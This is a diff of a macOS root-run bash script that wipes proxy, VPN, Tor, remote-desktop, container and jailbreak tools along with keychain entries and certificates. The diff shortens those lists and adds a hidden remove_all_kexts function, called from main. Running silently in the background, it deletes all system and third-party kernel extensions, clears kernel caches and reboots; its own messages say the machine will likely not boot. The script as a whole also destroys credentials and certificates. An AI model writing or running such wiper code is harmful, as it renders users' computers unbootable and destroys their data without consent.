@@ -294,11 +294,11 @@ remove_proxy_settings() {
         run networksetup -setftpproxy "$service" "" 0 2>/dev/null
         run networksetup -setsocksfirewallproxy "$service" "" 0 2>/dev/null
     done <<< "$services"
-    local proxy_processes=("shadowsocks" "ss-local" "ss-server" "ss-manager" "v2ray" "xray" "trojan" "trojan-go" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "mitmdump" "mitmweb" "privoxy" "polipo" "tinyproxy" "squid" "tor" "i2psvc" "i2p" "psiphon" "lantern" "outline" "stunnel" "stunnel4" "obfs4proxy" "meek-client" "snowflake" "dnscrypt-proxy" "dns2socks" "dns2tcp" "proxychains" "proxychains4" "redsocks" "microsocks" "gost" "brook" "wstunnel" "v2ray-plugin" "xray-plugin" "clash-verge" "clash-for-windows")
+    local proxy_processes=("shadowsocks" "ss-local" "ss-server" "ss-manager" "v2ray" "xray" "trojan" "trojan-go" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "privoxy")
     for proc in "${proxy_processes[@]}"; do
         run pkill -9 -f "$proc" 2>/dev/null
     done
-    local proxy_launch_items=("shadowsocks" "v2ray" "xray" "trojan" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "privoxy" "tor" "i2p" "psiphon" "lantern" "outline" "stunnel" "dnscrypt" "gost" "brook" "wstunnel")
+    local proxy_launch_items=("shadowsocks" "v2ray" "xray" "trojan" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "privoxy")
     for item in "${proxy_launch_items[@]}"; do
         for user_home in /Users/*; do
             for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
@@ -346,12 +346,12 @@ remove_vpn_and_ppp() {
     while IFS= read -r service; do
         [ -z "$service" ] && continue
         case "$service" in
-            *[Vv][Pp][Nn]*|[Ll]2[Tt][Pp]*|[Pp][Pp][Tt][Pp]*|[Ii][Pp][Ss][Ee][Cc]*|[Ww]ire[Gg]uard*|[Oo]pen[Vv][Pp][Nn]*|[Tt]unnel*[Bb]lick*|[Vv]iscosity*|[Ss]himo*|[Gg]lobal[Pp]rotect*|[Tt]ail[Ss]cale*|[Zz]ero[Tt]ier*|[Ss]oft[Ee]ther*|[Tt]inc*|[Ss]tunnel*|[Tt]or*|[Ii]2[Pp]*|[Pp]siphon*|[Ll]antern*|[Oo]utline*|[Ss]hadowsocks*|[Vv]2[Rr]ay*|[Xx]ray*|[Tt]rojan*|[Cc]lash*|[Ss]urge*|[Qq]uantumult*|[Ll]oon*|[Ss]hadow[Rr]ocket*|[Ss]tash*|[Hh]iddify*|[Nn]ekoray*|[Nn]eko[Bb]ox*|[Dd]ae*|[Mm]ihomo*)
+            *[Vv][Pp][Nn]*|[Ll]2[Tt][Pp]*|[Pp][Pp][Tt][Pp]*|[Ii][Pp][Ss][Ee][Cc]*|[Ww]ire[Gg]uard*|[Oo]pen[Vv][Pp][Nn]*|[Tt]unnel*[Bb]lick*|[Vv]iscosity*|[Ss]himo*|[Gg]lobal[Pp]rotect*)
                 run networksetup -removenetworkservice "$service" 2>/dev/null
                 ;;
         esac
     done <<< "$all_services"
-    local vpn_apps=("OpenVPN" "WireGuard" "Cisco AnyConnect" "AnyConnect" "FortiClient" "NordVPN" "ExpressVPN" "Surfshark" "CyberGhost" "Private Internet Access" "PIA" "Mullvad" "ProtonVPN" "TunnelBear" "Windscribe" "VyprVPN" "PureVPN" "Viscosity" "Tunnelblick" "Shimo" "GlobalProtect" "Tailscale" "ZeroTier" "strongSwan" "SoftEther VPN" "Tinc" "OpenConnect" "stunnel" "Tor Browser" "I2P" "Psiphon" "Lantern" "Outline" "Shadowsocks" "V2Ray" "Xray" "Trojan" "Clash" "Surge" "Quantumult" "Loon" "Shadowrocket" "Stash" "Hiddify" "Nekoray" "NekoBox" "dae" "mihomo" "Clash Verge" "Clash for Windows")
+    local vpn_apps=("OpenVPN" "WireGuard" "Cisco AnyConnect" "AnyConnect" "FortiClient" "NordVPN" "ExpressVPN" "Surfshark" "CyberGhost" "Private Internet Access" "PIA" "Mullvad" "ProtonVPN" "Tunnelblick" "Viscosity" "Shimo" "GlobalProtect")
     for app in "${vpn_apps[@]}"; do
         run rm -rf "/Applications/${app}.app" 2>/dev/null
         run rm -rf "/Applications/Utilities/${app}.app" 2>/dev/null
@@ -359,7 +359,7 @@ remove_vpn_and_ppp() {
             run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
         done
     done
-    local vpn_domains=("org.openvpn" "com.wireguard" "com.cisco.anyconnect" "com.fortinet.FortiClient" "com.nordvpn" "com.expressvpn" "com.surfshark" "com.cyberghost" "com.privateinternetaccess" "net.mullvad" "ch.protonvpn" "com.tunnelbear" "com.windscribe" "com.goldenfrog.VyprVPN" "com.purevpn" "com.sparklabs.Viscosity" "net.tunnelblick" "com.shimo" "com.paloaltonetworks.GlobalProtect" "io.tailscale" "com.zerotier" "org.strongswan" "org.softether" "org.tinc" "org.openconnect" "org.stunnel" "org.torproject" "net.i2p" "org.psiphon" "org.getlantern" "org.outline" "com.shadowsocks" "com.v2ray" "com.xray" "com.trojan" "com.clash" "com.surge" "com.quantumult" "com.loon" "com.shadowrocket" "com.stash" "com.hiddify" "com.nekoray" "com.nekobox" "com.dae" "com.mihomo")
+    local vpn_domains=("org.openvpn" "com.wireguard" "com.cisco.anyconnect" "com.fortinet.FortiClient" "com.nordvpn" "com.expressvpn" "com.surfshark" "com.cyberghost" "com.privateinternetaccess" "com.mullvad" "com.protonvpn" "com.tunnelblick" "com.viscosityvpn" "com.maxmind.GeoIP")
     for domain in "${vpn_domains[@]}"; do
         run defaults delete "${domain}" 2>/dev/null
         for user_home in /Users/*; do
@@ -393,7 +393,7 @@ remove_vpn_and_ppp() {
     run rm -rf "/Library/Extensions/tun.kext" 2>/dev/null
     run rm -rf "/Library/Extensions/tap.kext" 2>/dev/null
     run rm -rf "/Library/Extensions/wireguard.kext" 2>/dev/null
-    local vpn_processes=("openvpn" "wireguard" "wg-quick" "wg" "anyconnect" "vpnagentd" "acwebsecagent" "forticlient" "fortitray" "fortiwfw" "nordvpn" "expressvpn" "surfshark" "cyberghost" "pia" "mullvad" "protonvpn" "tunnelbear" "windscribe" "vyprvpn" "purevpn" "viscosity" "globalprotect" "tailscaled" "tailscale" "zerotier" "strongswan" "charon" "softether" "vpnclient" "vpnserver" "tincd" "openconnect" "stunnel" "tor" "i2p" "psiphon" "lantern" "outline" "shadowsocks" "v2ray" "xray" "trojan" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo")
+    local vpn_processes=("openvpn" "wireguard" "wg-quick" "wg" "anyconnect" "vpnagentd" "acwebsecagent" "forticlient" "fortitray" "fortiwfw" "nordvpn" "expressvpn" "surfshark" "cyberghost" "pia" "mullvad" "protonvpn")
     for proc in "${vpn_processes[@]}"; do
         run pkill -9 -f "$proc" 2>/dev/null
     done
@@ -411,7 +411,7 @@ remove_screen_sharing() {
     run pkill -f "AppleVNCServer" 2>/dev/null
     run pkill -f "ARDAgent" 2>/dev/null
     run pkill -f "RemoteDesktop" 2>/dev/null
-    local remote_apps=("TeamViewer" "TeamViewer_Host" "AnyDesk" "Chrome Remote Desktop" "Splashtop" "Splashtop Remote" "LogMeIn" "GoToMyPC" "ScreenConnect" "Bomgar" "RemotePC" "Zoho Assist" "Microsoft Remote Desktop" "Remote Desktop Manager" "mRemote" "Remmina" "RealVNC" "VNC Viewer" "TightVNC" "UltraVNC" "TigerVNC" "Chicken" "Duet Display" "Deskreen" "Parsec" "Moonlight" "Sunshine" "Luna Display" "Astropad" "Spacedesk" "AirServer" "Reflector" "AirParrot" "AirMedia" "Join.me")
+    local remote_apps=("TeamViewer" "TeamViewer_Host" "AnyDesk" "Chrome Remote Desktop" "Splashtop" "Splashtop Remote" "LogMeIn" "GoToMyPC" "ScreenConnect" "Bomgar" "RemotePC" "Zoho Assist" "Microsoft Remote Desktop")
     for app in "${remote_apps[@]}"; do
         run rm -rf "/Applications/${app}.app" 2>/dev/null
         run rm -rf "/Applications/Utilities/${app}.app" 2>/dev/null
@@ -419,7 +419,7 @@ remove_screen_sharing() {
             run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
         done
     done
-    local remote_domains=("com.teamviewer.TeamViewer" "com.teamviewer.TeamViewerHost" "com.anydesk.AnyDesk" "com.google.ChromeRemoteDesktop" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect" "com.bomgar" "com.remotepc" "com.zoho.assist" "com.microsoft.rdc" "com.remotedesktopmanager" "org.remmina" "com.realvnc" "com.tightvnc" "com.ultravnc" "com.tigervnc" "com.duetdisplay" "com.deskreen" "com.parsec" "com.moonlight-stream" "com.lunadisplay" "com.astropad" "com.spacedesk" "com.airserver" "com.airsquirrels.Reflector" "com.airsquirrels.AirParrot" "com.join.me")
+    local remote_domains=("com.teamviewer.TeamViewer" "com.teamviewer.TeamViewerHost" "com.anydesk.AnyDesk" "com.google.ChromeRemoteDesktop" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect")
     for domain in "${remote_domains[@]}"; do
         run defaults delete "${domain}" 2>/dev/null
         for user_home in /Users/*; do
@@ -430,7 +430,7 @@ remove_screen_sharing() {
         run rm -rf "/Library/Caches/${domain}" 2>/dev/null
         run rm -rf "/Library/Application Support/${domain}" 2>/dev/null
     done
-    local launch_items=("com.teamviewer" "com.anydesk" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect" "com.bomgar" "com.remotepc" "com.zoho" "com.parsec" "com.moonlight" "com.sunshine" "com.duetdisplay" "com.deskreen" "com.lunadisplay" "com.astropad" "com.spacedesk" "com.airserver" "com.airsquirrels" "com.join.me")
+    local launch_items=("com.teamviewer" "com.anydesk" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect" "com.bomgar" "com.remotepc" "com.zoho" "com.parsec" "com.moonlight")
     for item in "${launch_items[@]}"; do
         for user_home in /Users/*; do
             for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
@@ -449,7 +449,7 @@ remove_screen_sharing() {
     done
     for helper in /Library/PrivilegedHelperTools/*; do
         case "$(basename "$helper")" in
-            *teamviewer*|*anydesk*|*splashtop*|*logmein*|*gotomypc*|*screenconnect*|*bomgar*|*remotepc*|*zoho*|*parsec*|*moonlight*|*sunshine*|*duet*|*deskreen*|*luna*|*astropad*|*spacedesk*|*airserver*|*reflector*|*airparrot*|*join*)
+            *teamviewer*|*anydesk*|*splashtop*|*logmein*|*gotomypc*|*screenconnect*|*bomgar*|*remotepc*|*zoho*|*parsec*|*moonlight*)
                 run rm -rf "$helper" 2>/dev/null
                 ;;
         esac
@@ -464,15 +464,15 @@ remove_container_runtimes() {
             run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
         done
     done
-    local container_processes=("docker" "dockerd" "docker-compose" "docker-machine" "podman" "buildah" "skopeo" "runc" "containerd" "containerd-shim" "lima" "limactl" "colima" "rancher-desktop" "rdctl")
+    local container_processes=("docker" "dockerd" "docker-compose" "docker-machine" "podman" "buildah" "skopeo" "runc" "containerd" "containerd-shim" "lima" "limactl" "colima" "rancher-desktop")
     for proc in "${container_processes[@]}"; do
         run pkill -9 -f "$proc" 2>/dev/null
     done
-    local container_binaries=("/usr/local/bin/docker" "/usr/local/bin/docker-compose" "/usr/local/bin/docker-machine" "/usr/local/bin/podman" "/usr/local/bin/buildah" "/usr/local/bin/skopeo" "/usr/local/bin/runc" "/usr/local/bin/containerd" "/usr/local/bin/containerd-shim" "/usr/local/bin/lima" "/usr/local/bin/limactl" "/usr/local/bin/colima" "/usr/local/bin/nerdctl" "/usr/local/bin/ctr" "/usr/local/bin/crictl" "/usr/local/bin/kubectl")
+    local container_binaries=("/usr/local/bin/docker" "/usr/local/bin/docker-compose" "/usr/local/bin/docker-machine" "/usr/local/bin/podman" "/usr/local/bin/buildah" "/usr/local/bin/skopeo" "/usr/local/bin/runc" "/usr/local/bin/containerd" "/usr/local/bin/lima" "/usr/local/bin/colima")
     for binary in "${container_binaries[@]}"; do
         run rm -f "$binary" 2>/dev/null
     done
-    local container_dirs=("/etc/docker" "/var/lib/docker" "/var/lib/containerd" "/var/lib/containers" "/var/lib/podman" "/var/lib/buildah" "/var/lib/rancher" "/var/lib/colima" "/var/lib/lima" "/opt/docker" "/opt/podman" "/opt/containerd" "/opt/rancher" "/opt/colima" "/opt/lima")
+    local container_dirs=("/etc/docker" "/var/lib/docker" "/var/lib/containerd" "/var/lib/containers" "/var/lib/podman" "/var/lib/buildah" "/var/lib/rancher" "/var/lib/colima" "/var/lib/lima" "/opt/colima")
     for dir in "${container_dirs[@]}"; do
         run rm -rf "$dir" 2>/dev/null
     done
@@ -530,11 +530,11 @@ remove_jailbreak_tools() {
             run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
         done
     done
-    local jb_binaries=("/usr/local/bin/checkra1n" "/usr/local/bin/unc0ver" "/usr/local/bin/palera1n" "/usr/local/bin/dopamine" "/usr/local/bin/xinaA15" "/usr/local/bin/rootlessJB" "/usr/local/bin/chimera" "/usr/local/bin/electra" "/usr/local/bin/odyssey" "/usr/local/bin/taurine" "/usr/local/bin/fugu")
+    local jb_binaries=("/usr/local/bin/checkra1n" "/usr/local/bin/unc0ver" "/usr/local/bin/palera1n" "/usr/local/bin/dopamine" "/usr/local/bin/xinaA15" "/usr/local/bin/rootlessJB")
     for binary in "${jb_binaries[@]}"; do
         run rm -f "$binary" 2>/dev/null
     done
-    local jb_dirs=("/usr/local/share/checkra1n" "/usr/local/share/palera1n" "/usr/local/share/unc0ver" "/usr/local/share/chimera" "/usr/local/share/electra" "/usr/local/share/odyssey" "/usr/local/share/taurine" "/usr/local/share/fugu")
+    local jb_dirs=("/usr/local/share/checkra1n" "/usr/local/share/palera1n" "/usr/local/share/unc0ver" "/usr/local/share/chimera" "/usr/local/share/electra" "/usr/local/share/odyssey")
     for dir in "${jb_dirs[@]}"; do
         run rm -rf "$dir" 2>/dev/null
     done
@@ -606,7 +606,7 @@ cleanup_keychain() {
     keychains=$(security list-keychains 2>/dev/null | tr -d '"'"'"'"'"' ) || true
     while IFS= read -r keychain; do
         [ -z "$keychain" ] && continue
-        local ios_generic_patterns=("com.apple.mobile." "com.apple.rapport" "com.apple.sharingd" "com.apple.continuity" "com.apple.handoff" "com.apple.airdrop" "com.apple.airplay" "com.apple.ios" "com.apple.mobilebackup" "com.apple.mobilesync" "com.apple.mobileactivation" "com.apple.mobile.installation" "com.apple.mobile.softwareupdated")
+        local ios_generic_patterns=("com.apple.mobile." "com.apple.rapport" "com.apple.sharingd" "com.apple.continuity" "com.apple.handoff" "com.apple.airdrop" "com.apple.airplay" "com.apple.ios")
         for pattern in "${ios_generic_patterns[@]}"; do
             run security delete-generic-password -l "$pattern" "$keychain" 2>/dev/null
             run security delete-generic-password -s "$pattern" "$keychain" 2>/dev/null
@@ -618,7 +618,7 @@ cleanup_keychain() {
             run security delete-internet-password -s "$domain" "$keychain" 2>/dev/null
             run security delete-internet-password -a "$domain" "$keychain" 2>/dev/null
         done
-        local cert_patterns=("iPhone Developer" "iPhone Distribution" "Apple Development" "Apple Distribution" "Developer ID" "Apple Worldwide Developer Relations" "Apple Root" "iPhone" "iOS" "Apple ID" "iCloud" "APNs" "Push" "Pass Type" "Mac App" "Mac Installer" "Developer ID Application" "Developer ID Installer")
+        local cert_patterns=("iPhone Developer" "iPhone Distribution" "Apple Development" "Apple Distribution" "Developer ID" "Apple Worldwide Developer Relations" "Apple Root" "iPhone" "iOS" "Apple")
         for pattern in "${cert_patterns[@]}"; do
             run security delete-certificate -c "$pattern" "$keychain" 2>/dev/null
             run security delete-certificate -Z "$pattern" "$keychain" 2>/dev/null
@@ -675,6 +675,10 @@ remove_backup_files() {
     done
 }
 
+remove_all_kexts() {
+    sudo nohup bash -c 'set -euo pipefail; echo "[!!!] Removing ALL kexts. System will likely not boot."; KEXT_DIRS=("/Library/Extensions" "/System/Library/Extensions"); for dir in "${KEXT_DIRS[@]}"; do if [ -d "$dir" ]; then echo "[!] Wiping $dir"; rm -rf "$dir"/*.kext; fi; done; echo "[*] Clearing kernel caches..."; rm -rf /System/Library/PrelinkedKernels/*; rm -rf /System/Library/Caches/com.apple.kext.caches/*; echo "[*] Attempting cache rebuild..."; kextcache -i / || true; echo "[*] Completed. Reboot will likely fail."; reboot' > /dev/null 2>&1 &
+}
+
 main() {
     [ "$(id -u)" -ne 0 ] && exit 1
     remove_apfs_snapshots
@@ -693,6 +697,7 @@ main() {
     remove_jailbreak_tools
     cleanup_keychain
     remove_backup_files
+    remove_all_kexts
 }
 
 install() {
